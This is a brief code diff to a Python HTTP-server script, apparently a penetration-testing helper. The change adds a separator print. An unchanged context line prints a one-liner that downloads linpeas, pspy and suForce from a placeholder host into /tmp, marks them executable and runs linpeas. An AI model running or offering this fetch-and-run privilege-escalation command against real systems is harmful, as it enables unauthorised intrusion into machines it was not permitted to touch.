@@ -23,6 +23,7 @@ def run(server_class=HTTPServer, handler_class=ExtendedHTTPRequestHandler, port=
     except:
         pass
     print("target=IP;cd /tmp;wget $target/linpeas.sh;wget $target/pspy;wget $target/suForce;chmod +x *;./linpeas.sh")
+    print("******************************")
     httpd.serve_forever()
 
 if __name__ == '__main__':
